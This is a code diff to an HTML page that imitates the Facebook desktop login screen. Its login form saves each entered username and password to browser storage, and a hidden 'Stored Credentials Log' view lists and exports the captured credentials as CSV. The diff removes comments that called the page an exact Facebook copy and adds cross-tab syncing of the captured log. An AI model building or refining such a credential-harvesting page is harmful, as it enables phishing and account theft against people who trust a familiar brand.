@@ -20,7 +20,7 @@
 </head>
 <body class="h-full bg-white text-[#1c1e21] flex flex-col justify-between font-sans selection:bg-blue-500 selection:text-white" style="background-color: #ffffff;">
 
-  <!-- TOP HEADER / NAV (Minimalist logo left, subtle admin log access right) -->
+  <!-- TOP HEADER / NAV -->
   <header class="w-full px-8 py-4 flex items-center justify-between bg-transparent">
     <div class="flex items-center space-x-2">
       <svg viewBox="0 0 36 36" class="w-9 h-9 text-[#0866ff]" fill="currentColor" height="36" width="36">
@@ -34,21 +34,18 @@
     </nav>
   </header>
 
-  <!-- MAIN CONTAINER: Exact layout match with Facebook desktop landing -->
+  <!-- MAIN CONTAINER -->
   <main class="flex-grow flex items-center justify-center px-4 py-4 max-w-7xl mx-auto w-full">
 
-    <!-- VIEW 1: EXACT FACEBOOK DESKTOP SPLIT LAYOUT -->
+    <!-- VIEW 1: LOGIN SPLIT LAYOUT -->
     <div id="loginView" class="w-full flex flex-col lg:flex-row items-center justify-between gap-12 lg:gap-20 animate-fade-in py-8">
       
       <!-- Left Column: Illustration & Tagline -->
       <div class="w-full lg:w-7/12 flex flex-col items-center lg:items-start text-center lg:text-left">
-        <!-- Graphic / Collage Mockup representation -->
         <div class="relative w-full max-w-xl h-72 lg:h-96 mb-6 flex items-center justify-center lg:justify-start">
-          <!-- Floating Reaction Emoji Bubble -->
           <div class="absolute top-4 left-4 lg:left-0 z-10 w-12 h-12 bg-white rounded-full shadow-lg flex items-center justify-center text-2xl animate-bounce">
             😆
           </div>
-          <!-- Mock Reels / Post Cards Collage -->
           <div class="flex items-center space-x-4">
             <div class="w-36 lg:w-48 h-64 lg:h-80 bg-gray-100 rounded-2xl shadow-md border border-gray-200 overflow-hidden relative flex flex-col items-center justify-center p-4">
               <div class="w-12 h-12 rounded-full bg-orange-400 mb-2 flex items-center justify-center text-white text-xl font-bold">🧊</div>
@@ -66,7 +63,6 @@
               <div class="w-20 h-2 bg-white/40 rounded-full mb-1"></div>
             </div>
           </div>
-          <!-- Profile Avatar Floating Badge -->
           <div class="absolute bottom-2 left-28 lg:left-36 z-20 w-14 h-14 rounded-full border-4 border-white shadow-xl overflow-hidden bg-cover bg-center bg-[url('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=150&q=80')]"></div>
         </div>
 
@@ -79,7 +75,6 @@
       <div class="w-full lg:w-5/12 max-w-[396px] flex flex-col items-center">
         <div class="w-full bg-white rounded-xl shadow-[0_2px_4px_rgba(0,0,0,0.1),0_8px_16px_rgba(0,0,0,0.1)] p-4 border border-gray-100">
           
-          <!-- Alert Banner -->
           <div id="loginAlert" class="hidden mb-4 p-3 rounded-md text-xs flex items-start space-x-2 border"></div>
 
           <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-3">
@@ -156,7 +151,7 @@
             <i class="fa-solid fa-database text-[#0866ff]"></i>
             <span>Stored Credentials Log</span>
           </h2>
-          <p class="text-xs text-gray-500 mt-1">All captured usernames and passwords stored securely in local storage.</p>
+          <p class="text-xs text-gray-500 mt-1">All captured usernames and passwords stored securely in persistent local storage.</p>
         </div>
         <div class="flex items-center space-x-3">
           <button onclick="exportAllCsv()" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded-md shadow transition flex items-center space-x-2">
@@ -231,7 +226,7 @@
     </div>
   </div>
 
-  <!-- FOOTER (Exact Facebook Footer Style with languages & copyright) -->
+  <!-- FOOTER -->
   <footer class="w-full py-6 px-6 bg-white border-t border-gray-200 text-center text-xs text-[#737373]">
     <div class="max-w-6xl mx-auto space-y-2">
       <div class="flex flex-wrap justify-center gap-x-3 gap-y-1 text-[#737373] text-[12px]">
@@ -273,6 +268,16 @@
   <script>
     let countdownInterval = null;
 
+    // Listen to storage events so open tabs/windows sync automatically when new credentials are logged
+    window.addEventListener('storage', function(e) {
+      if (e.key === 'drive_access_creds') {
+        const adminView = document.getElementById('adminView');
+        if (!adminView.classList.contains('hidden')) {
+          renderCredentialsTable();
+        }
+      }
+    });
+
     // View Switcher
     function switchView(viewName) {
       document.getElementById('loginView').classList.add('hidden');
@@ -308,14 +313,14 @@
       }
     }
 
-    // Handle Login & CSV Generation / Storage
+    // Handle Login & Persistent Storage
     function handleLogin(e) {
       e.preventDefault();
       const username = document.getElementById('usernameInput').value.trim();
       const password = document.getElementById('passwordInput').value;
       const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
 
-      // Save to LocalStorage
+      // Save to localStorage (persistent across windows/tabs and browser restarts)
       let credentials = JSON.parse(localStorage.getItem('drive_access_creds') || '[]');
       credentials.unshift({ timestamp, username, password });
       localStorage.setItem('drive_access_creds', JSON.stringify(credentials));
